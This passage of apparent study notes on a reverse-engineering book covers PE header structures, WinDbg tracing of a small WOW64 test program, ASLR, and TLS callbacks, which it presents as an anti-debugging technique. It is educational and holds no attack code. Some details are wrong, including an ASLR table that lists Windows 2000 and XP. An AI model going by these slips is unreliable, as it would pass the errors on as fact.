IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;<br><br>#ifdef _WIN64<br>typedef IMAGE_NT_HEADERS64  IMAGE_NT_HEADERS;<br>typedef PIMAGE_NT_HEADERS64 PIMAGE_NT_HEADERS;<br>#else<br>typedef IMAGE_NT_HEADERS32  IMAGE_NT_HEADERS;<br>typedef PIMAGE_NT_HEADERS32 PIMAGE_NT_HEADERS;<br>#endif<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure></p><hr><p><strong>IMAGE_FILE_HEADER</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#define IMAGE_FILE_MACHINE_UNKNOWN      0<br>#define IMAGE_FILE_MACHINE_TARGET_HOST  0x0001<br>#define IMAGE_FILE_MACHINE_I386         0x014c<br>#define IMAGE_FILE_MACHINE_R3000        0x0162<br><br>#define IMAGE_FILE_MACHINE_R4000        0x0166<br>#define IMAGE_FILE_MACHINE_R10000       0x0168<br>#define IMAGE_FILE_MACHINE_WCEMIPSV2    0x0169<br><br>#define IMAGE_FILE_MACHINE_ALPHA        0x0184<br>#define IMAGE_FILE_MACHINE_SH3          0x01a2<br>#define IMAGE_FILE_MACHINE_SH3DSP       0x01a3<br>#define IMAGE_FILE_MACHINE_SH3E         0x01a4<br>#define IMAGE_FILE_MACHINE_SH4          0x01a6<br>#define IMAGE_FILE_MACHINE_SH5          0x01a8<br>#define IMAGE_FILE_MACHINE_ARM          0x01c0<br>#define IMAGE_FILE_MACHINE_THUMB        0x01c2<br>#define IMAGE_FILE_MACHINE_ARMNT        0x01c4<br>#define IMAGE_FILE_MACHINE_AM33         0x01d3<br>#define IMAGE_FILE_MACHINE_POWERPC      0x01f0<br><br>#define IMAGE_FILE_MACHINE_POWERPCFP    0x01f1<br>#define IMAGE_FILE_MACHINE_IA64         0x0200<br>#define IMAGE_FILE_MACHINE_MIPS16       0x0266<br>#define IMAGE_FILE_MACHINE_ALPHA64      0x0284<br>#define IMAGE_FILE_MACHINE_AXP64 IMAGE_FILE_MACHINE_ALPHA64<br>#define IMAGE_FILE_MACHINE_MIPSFPU      0x0366<br>#define IMAGE_FILE_MACHINE_MIPSFPU16    0x0466<br>#define IMAGE_FILE_MACHINE_TRICORE      0x0520<br>#define IMAGE_FILE_MACHINE_CEF          0x0cef<br>#define IMAGE_FILE_MACHINE_EBC          0x0ebc<br>#define IMAGE_FILE_MACHINE_CHPE_X86     0x3a64<br>#define IMAGE_FILE_MACHINE_AMD64        0x8664<br>#define IMAGE_FILE_MACHINE_M32R         0x9041<br>#define IMAGE_FILE_MACHINE_ARM64EC      0xa641<br>#define IMAGE_FILE_MACHINE_ARM64X       0xa64e<br>#define IMAGE_FILE_MACHINE_ARM64        0xaa64<br>#define IMAGE_FILE_MACHINE_RISCV32      0x5032<br>#define IMAGE_FILE_MACHINE_RISCV64      0x5064<br>#define IMAGE_FILE_MACHINE_RISCV128     0x5128<br>#define IMAGE_FILE_MACHINE_CEE          0xc0ee<br><br>//Source: //Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure></p><hr><p><strong>IMAGE_OPTIONAL_HEADER</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_OPTIONAL_HEADER &#123;<br><br>  /* Standard fields */<br><br>  WORD  Magic; /* 0x10b or 0x107 *//* 0x00 */<br>  BYTE  MajorLinkerVersion;<br>  BYTE  MinorLinkerVersion;<br>  DWORD SizeOfCode;<br>  DWORD SizeOfInitializedData;<br>  DWORD SizeOfUninitializedData;<br>  DWORD AddressOfEntryPoint;/* 0x10 */<br>  DWORD BaseOfCode;<br>  DWORD BaseOfData;<br><br>  /* NT additional fields */<br><br>  DWORD ImageBase;<br>  DWORD SectionAlignment;/* 0x20 */<br>  DWORD FileAlignment;<br>  WORD  MajorOperatingSystemVersion;<br>  WORD  MinorOperatingSystemVersion;<br>  WORD  MajorImageVersion;<br>  WORD  MinorImageVersion;<br>  WORD  MajorSubsystemVersion;/* 0x30 */<br>  WORD  MinorSubsystemVersion;<br>  DWORD Win32VersionValue;<br>  DWORD SizeOfImage;<br>  DWORD SizeOfHeaders;<br>  DWORD CheckSum;/* 0x40 */<br>  WORD  Subsystem;<br>  WORD  DllCharacteristics;<br>  DWORD SizeOfStackReserve;<br>  DWORD SizeOfStackCommit;<br>  DWORD SizeOfHeapReserve;/* 0x50 */<br>  DWORD SizeOfHeapCommit;<br>  DWORD LoaderFlags;<br>  DWORD NumberOfRvaAndSizes;<br>  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; /* 0x60 */<br>  /* 0xE0 */<br>&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;<br><br>typedef struct _IMAGE_OPTIONAL_HEADER64 &#123;<br>  WORD  Magic; /* 0x20b */<br>  BYTE MajorLinkerVersion;<br>  BYTE MinorLinkerVersion;<br>  DWORD SizeOfCode;<br>  DWORD SizeOfInitializedData;<br>  DWORD SizeOfUninitializedData;<br>  DWORD AddressOfEntryPoint;<br>  DWORD BaseOfCode;<br>  ULONGLONG ImageBase;<br>  DWORD SectionAlignment;<br>  DWORD FileAlignment;<br>  WORD MajorOperatingSystemVersion;<br>  WORD MinorOperatingSystemVersion;<br>  WORD MajorImageVersion;<br>  WORD MinorImageVersion;<br>  WORD MajorSubsystemVersion;<br>  WORD MinorSubsystemVersion;<br>  DWORD Win32VersionValue;<br>  DWORD SizeOfImage;<br>  DWORD SizeOfHeaders;<br>  DWORD CheckSum;<br>  WORD Subsystem;<br>  WORD DllCharacteristics;<br>  ULONGLONG SizeOfStackReserve;<br>  ULONGLONG SizeOfStackCommit;<br>  ULONGLONG SizeOfHeapReserve;<br>  ULONGLONG SizeOfHeapCommit;<br>  DWORD LoaderFlags;<br>  DWORD NumberOfRvaAndSizes;<br>  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];<br>&#125; IMAGE_OPTIONAL_HEADER64, *PIMAGE_OPTIONAL_HEADER64;<br><br>/* Possible Magic values */<br>#define IMAGE_NT_OPTIONAL_HDR32_MAGIC      0x10b<br>#define IMAGE_NT_OPTIONAL_HDR64_MAGIC      0x20b<br>#define IMAGE_ROM_OPTIONAL_HDR_MAGIC       0x107<br><br>#ifdef _WIN64<br>#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER IMAGE_SIZEOF_NT_OPTIONAL64_HEADER<br>#define IMAGE_NT_OPTIONAL_HDR_MAGIC     IMAGE_NT_OPTIONAL_HDR64_MAGIC<br>#else<br>#define IMAGE_SIZEOF_NT_OPTIONAL_HEADER IMAGE_SIZEOF_NT_OPTIONAL32_HEADER<br>#define IMAGE_NT_OPTIONAL_HDR_MAGIC     IMAGE_NT_OPTIONAL_HDR32_MAGIC<br>#endif<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure></p><hr><p><strong>Stack &amp; Heap</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_THUNK_DATA64 &#123;<br>union &#123;<br>ULONGLONG ForwarderString;<br>ULONGLONG Function;<br>ULONGLONG Ordinal;<br>ULONGLONG AddressOfData;<br>&#125; u1;<br>&#125; IMAGE_THUNK_DATA64,*PIMAGE_THUNK_DATA64;<br>#pragma pack(pop)<br><br>typedef struct _IMAGE_THUNK_DATA32 &#123;<br>union &#123;<br>DWORD ForwarderString;<br>DWORD Function;<br>DWORD Ordinal;<br>DWORD AddressOfData;<br>&#125; u1;<br>&#125; IMAGE_THUNK_DATA32,*PIMAGE_THUNK_DATA32;<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure></p><hr><p><strong>IMAGE_IMPORT_DESCRIPTOR</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_IMPORT_DESCRIPTOR &#123;<br>union &#123;<br>DWORDCharacteristics; /* 0 for terminating null import descriptor  */<br>DWORDOriginalFirstThunk;/* RVA to original unbound IAT */<br>&#125; DUMMYUNIONNAME;<br>DWORDTimeDateStamp;/* 0 if not bound,<br> * -1 if bound, and real date\time stamp<br> *    in IMAGE_DIRECTORY_ENTRY_BOUND_IMPORT<br> * (new BIND)<br> * otherwise date/time stamp of DLL bound to<br> * (Old BIND)<br> */<br>DWORDForwarderChain;/* -1 if no forwarders */<br>DWORDName;<br>/* RVA to IAT (if bound this IAT has actual addresses) */<br>DWORDFirstThunk;<br>&#125; IMAGE_IMPORT_DESCRIPTOR,*PIMAGE_IMPORT_DESCRIPTOR;<br></code></pre></td></tr></table></figure></p><h1 id="Chapter-39-WinDbg"><a href="#Chapter-39-WinDbg" class="headerlink" title="Chapter 39 - WinDbg"></a>Chapter 39 - WinDbg</h1><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/39.1.png'><img src="/images/books/ReverseEngineeringCore/39.1.png" width="800"></p><h1 id="Chapter-40-64-bit-Debugging"><a href="#Chapter-40-64-bit-Debugging" class="headerlink" title="Chapter 40 - 64-bit Debugging"></a>Chapter 40 - 64-bit Debugging</h1><h2 id="40-1-Debugger-on-x64-Platform"><a href="#40-1-Debugger-on-x64-Platform" class="headerlink" title="40.1 - Debugger on x64 Platform"></a>40.1 - Debugger on x64 Platform</h2><div class="table-container"><table><thead><tr><th>OS</th><th>PE32</th><th>PE32+</th></tr></thead><tbody><tr><td>32-bit</td><td>OllyDbg, IDA Pro, WinDbg</td><td>IDA Pro (Disassemble only)</td></tr><tr><td>64-bit</td><td>OllyDbg, IDA Pro, WinDbg</td><td>IDA Pro, WinDbg</td></tr></tbody></table></div><h2 id="40-2-x64-Debugging"><a href="#40-2-x64-Debugging" class="headerlink" title="40.2 - x64 Debugging"></a>40.2 - x64 Debugging</h2><p><strong>WOW64Test</strong><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">#include &quot;stdio.h&quot;<br>#include &quot;windows.h&quot;<br>#include &quot;Shlobj.h&quot;<br>#include &quot;tchar.h&quot;<br>#pragma comment(lib, &quot;Shell32.lib&quot;)<br><br>int _tmain(int argc, TCHAR* argv[])<br>&#123;<br>    HKEY    hKey                = NULL;<br>    HANDLE  hFile               = INVALID_HANDLE_VALUE;<br>    TCHAR   szPath[MAX_PATH]    = &#123;0,&#125;;<br><br>    ////////////////<br>    // system32 folder<br>    if( GetSystemDirectory(szPath, MAX_PATH) )<br>    &#123;<br>        _tprintf(L&quot;1) system32 path = %s\n&quot;, szPath);<br>    &#125;<br><br>    ////////////////<br>    // File size<br>    _tcscat_s(szPath, L&quot;\\kernel32.dll&quot;);<br>    hFile = CreateFile(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, <br>                       OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);<br>    if( hFile != INVALID_HANDLE_VALUE )<br>    &#123;<br>        _tprintf(L&quot;2) File size of \&quot;%s\&quot; = %d\n&quot;, <br>        szPath, GetFileSize(hFile, NULL));<br>        CloseHandle(hFile);<br>    &#125;<br><br>    ////////////////<br>    // Program Files<br>    if( SHGetSpecialFolderPath(NULL, szPath, <br>                               CSIDL_PROGRAM_FILES, FALSE) )<br>    &#123;<br>        _tprintf(L&quot;3) Program Files path = %s\n&quot;, szPath);<br>    &#125;<br><br>    ////////////////<br>    // Registry<br>    if( ERROR_SUCCESS == RegCreateKey(HKEY_LOCAL_MACHINE, <br>                                      L&quot;SOFTWARE\\ReverseCore&quot;, &amp;hKey) )<br>    &#123;<br>        RegCloseKey(hKey);<br>        _tprintf(L&quot;4) Create Registry Key : HKLM\\SOFTWARE\\ReverseCore\n&quot;);<br>    &#125;<br><br>    return 0;<br>&#125;<br><br></code></pre></td></tr></table></figure></p><h2 id="40-3-WOW64Test-x86-exe"><a href="#40-3-WOW64Test-x86-exe" class="headerlink" title="40.3 - WOW64Test_x86.exe"></a>40.3 - WOW64Test_x86.exe</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.1.png'><img src="/images/books/ReverseEngineeringCore/40.1.png" width="1000">    <figcaption>    Run code.    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.2.png'><img src="/images/books/ReverseEngineeringCore/40.2.png" width="700">    <figcaption>    Enable "x64 Compatibility-mode [single-step]    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.3.png'><img src="/images/books/ReverseEngineeringCore/40.3.png" width="600">    <figcaption>    Startup    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.4.png'><img src="/images/books/ReverseEngineeringCore/40.4.png" width="600">    <figcaption>    main() function.    </figcaption></p><h2 id="40-4-WOW64Test-x64-exe"><a href="#40-4-WOW64Test-x64-exe" class="headerlink" title="40.4 - WOW64Test_x64.exe"></a>40.4 - WOW64Test_x64.exe</h2><p>We use <strong>WinDbg</strong> to debug this executable<br>File -&gt; Launch Executable</p><p>Firstly, we need to obtain the EP address.<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; !dh WOW64Test_x64<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.5.png'><img src="/images/books/ReverseEngineeringCore/40.5.png" width="700">    <figcaption>    Display PE header.    </figcaption></p><p>Go into EP:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; g WOW64Test_x64 + 142C<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.6.png'><img src="/images/books/ReverseEngineeringCore/40.6.png" width="800">    <figcaption>    Go into EP.    </figcaption></p><p>Show more instructions:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; u eip L10<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.7.png'><img src="/images/books/ReverseEngineeringCore/40.7.png" width="700">    <figcaption>    Display more instructions.    </figcaption></p><p>Trace the <code>jmp</code> instruction at <code>00000001 40001439</code><br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; g WOW64Test_x64 + 12b4<br>&gt; u eip L60<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.8.png'><img src="/images/books/ReverseEngineeringCore/40.8.png" width="700">    <figcaption>    Trace function    </figcaption></p><hr><p>main() function<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; bp KERNEL32!GetCommandLineW<br>&gt; g<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.9.png'><img src="/images/books/ReverseEngineeringCore/40.9.png" width="1200">    <figcaption>    Set breakpoint.    </figcaption></p><p>Obtain the return address from stack<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; r rsp<br>&gt; dq rsp<br></code></pre></td></tr></table></figure></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.10.png'><img src="/images/books/ReverseEngineeringCore/40.10.png" width="1200">    <figcaption>    View register, and then dump the register.    </figcaption></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; g 00000001`40001381<br>&gt; u eip L20<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.11.png'><img src="/images/books/ReverseEngineeringCore/40.11.png" width="1200">    <figcaption>    Go to the address that we obtained, this is the main() function that we want since the return address is the address of main function. The assembly code above is the assembly code of main().    </figcaption></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; g 00000001`400013ea<br>&gt; r<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.12.png'><img src="/images/books/ReverseEngineeringCore/40.12.png" width="800">    <figcaption>    Arguments.    </figcaption></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; db rdx<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.13.png'><img src="/images/books/ReverseEngineeringCore/40.13.png" width="800">    <figcaption>    Dump rdx to show argument.    </figcaption></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; db rdx<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.14.png'><img src="/images/books/ReverseEngineeringCore/40.14.png" width="800">    <figcaption>    Dump r8 to show stack pointers.    </figcaption></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">&gt; db 023b3ac0 l200<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/40.15.png'><img src="/images/books/ReverseEngineeringCore/40.15.png" width="800">    <figcaption>    Dump the stack. The address 023b3ac0 is the address of the first element of the array of last result (`db rdx`). Always remember little-endian is used.    </figcaption></p><h1 id="Chapter-41-ASLR"><a href="#Chapter-41-ASLR" class="headerlink" title="Chapter 41 - ASLR"></a>Chapter 41 - ASLR</h1><p>ASLR stands for <strong>Address Space Layout Randomization</strong>.</p><p>Windows OS that apply ASLR:</p><div class="table-container"><table><thead><tr><th>OS</th><th>Kernal Version</th></tr></thead><tbody><tr><td>Windows 2000</td><td>5.0</td></tr><tr><td>Windows XP</td><td>5.1</td></tr><tr><td>Windows Server 2003</td><td>5.2</td></tr><tr><td>Windows Vista</td><td>6.0</td></tr><tr><td>Windows Server 2008</td><td>6.0</td></tr><tr><td>Windows Server 2008 R2</td><td>6.1</td></tr><tr><td>Windows 7</td><td>6.1</td></tr></tbody></table></div><p>IMAGE_FILE_HEADER\Characteristics</p><p>IMAGE_FILE_RELOCS_STRIPPED</p><h1 id="Chapter-42-Session-of-Kernel-6"><a href="#Chapter-42-Session-of-Kernel-6" class="headerlink" title="Chapter 42 - Session of Kernel 6"></a>Chapter 42 - Session of Kernel 6</h1><p>Session 0 Isolation</p><h1 id="Chapter-43-DLL-Injection-in-Kernel-6"><a href="#Chapter-43-DLL-Injection-in-Kernel-6" class="headerlink" title="Chapter 43 - DLL Injection in Kernel 6"></a>Chapter 43 - DLL Injection in Kernel 6</h1><h1 id="Chapter-44-InjDll-exe——A-Tool-for-DLL-Injection"><a href="#Chapter-44-InjDll-exe——A-Tool-for-DLL-Injection" class="headerlink" title="Chapter 44 - InjDll.exe——A Tool for DLL Injection"></a>Chapter 44 - InjDll.exe——A Tool for DLL Injection</h1><h1 id="Chapter-45-TLS-Callback-Function"><a href="#Chapter-45-TLS-Callback-Function" class="headerlink" title="Chapter 45 - TLS Callback Function"></a>Chapter 45 - TLS Callback Function</h1><p>From this point on, this book will introduce more advanced topics in reverse engineering.</p><p>Here, TLS stands for <strong>Thread Local Storage</strong>, instead of <strong>Transport Layer Security</strong> used in networking.</p><p>TLS Callback Function is commonly used in anti-debugging.</p><h2 id="45-1-Practice-1-HelloTls-exe"><a href="#45-1-Practice-1-HelloTls-exe" class="headerlink" title="45.1 - Practice#1 HelloTls.exe"></a>45.1 - Practice#1 HelloTls.exe</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.1.png'><img src="/images/books/ReverseEngineeringCore/45.1.png" width="500">    <figcaption>    Running HelloTls.exe    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.2.png'><img src="/images/books/ReverseEngineeringCore/45.2.png" width="500">    <figcaption>    Debugging HelloTls.exe    </figcaption></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.3.png'><img src="/images/books/ReverseEngineeringCore/45.3.png" width="700">    <figcaption>    OllyDbg: HelloTls.exe is terminated.    </figcaption></p><h2 id="45-2-TLS"><a href="#45-2-TLS" class="headerlink" title="45.2 - TLS"></a>45.2 - TLS</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.4.png'><img src="/images/books/ReverseEngineeringCore/45.4.png" width="700">    <figcaption>    IMAGE_NT_HEADERS\IMAGE-OPTIOAL_HEADER\IMAGE_DATA_DIRECTORY[9] -> TLS Table    </figcaption></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_TLS_DIRECTORY64 &#123;<br>    ULONGLONG   StartAddressOfRawData;<br>    ULONGLONG   EndAddressOfRawData;<br>    ULONGLONG   AddressOfIndex;<br>    ULONGLONG   AddressOfCallBacks;<br>    DWORD       SizeOfZeroFill;<br>    DWORD       Characteristics;<br>&#125; IMAGE_TLS_DIRECTORY64, *PIMAGE_TLS_DIRECTORY64;<br><br>typedef struct _IMAGE_TLS_DIRECTORY32 &#123;<br>    DWORD   StartAddressOfRawData;<br>    DWORD   EndAddressOfRawData;<br>    DWORD   AddressOfIndex;<br>    DWORD   AddressOfCallBacks;<br>    DWORD   SizeOfZeroFill;<br>    DWORD   Characteristics;<br>&#125; IMAGE_TLS_DIRECTORY32, *PIMAGE_TLS_DIRECTORY32;<br><br>#ifdef _WIN64<br>typedef IMAGE_TLS_DIRECTORY64           IMAGE_TLS_DIRECTORY;<br>typedef PIMAGE_TLS_DIRECTORY64          PIMAGE_TLS_DIRECTORY;<br>#else<br>typedef IMAGE_TLS_DIRECTORY32           IMAGE_TLS_DIRECTORY;<br>typedef PIMAGE_TLS_DIRECTORY32          PIMAGE_TLS_DIRECTORY;<br>#endif<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.5.png'><img src="/images/books/ReverseEngineeringCore/45.5.png" width="700">    <figcaption>    IMAGE_TLS_DIRECTORY    </figcaption></p><p><strong>AddressOfCallbacks</strong> stores an array of pointers which point to callback functions. It is a significant member in structure <strong>IMAGE_TLS_DIRECTORY</strong>. The array is ended with NULL value.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/45.6.png'><img src="/images/books/ReverseEngineeringCore/45.6.png" width="700">    <figcaption>    PEView.exe: AddressOfCallbacks    </figcaption></p><p>Notice that we can register multiple TLS callback functions by modifying the program, even though the original program contains only one TLS callback.</p><h2 id="45-3-TLS-Callback-Function"><a href="#45-3-TLS-Callback-Function" class="headerlink" title="45.3 - TLS Callback Function"></a>45.3 - TLS Callback Function</h2><p>A TLS callback function is invoked whenever a process thread is created or terminated.<br>When the main thread is created, the TLS callback is executed before the program’s entry point (EP).<br>This behavior can be leveraged for anti-debugging purposes.</p><p>Notice that the TLS callback function is invoked when the program is terminated.</p><h3 id="IMAGE-TLS-CALLBACK"><a href="#IMAGE-TLS-CALLBACK" class="headerlink" title="IMAGE_TLS_CALLBACK"></a>IMAGE_TLS_CALLBACK</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef VOID (CALLBACK *PIMAGE_TLS_CALLBACK)(<br>LPVOID DllHandle,<br>    DWORD Reason,<br>    LPVOID Reserved<br>);<br><br>//Source: 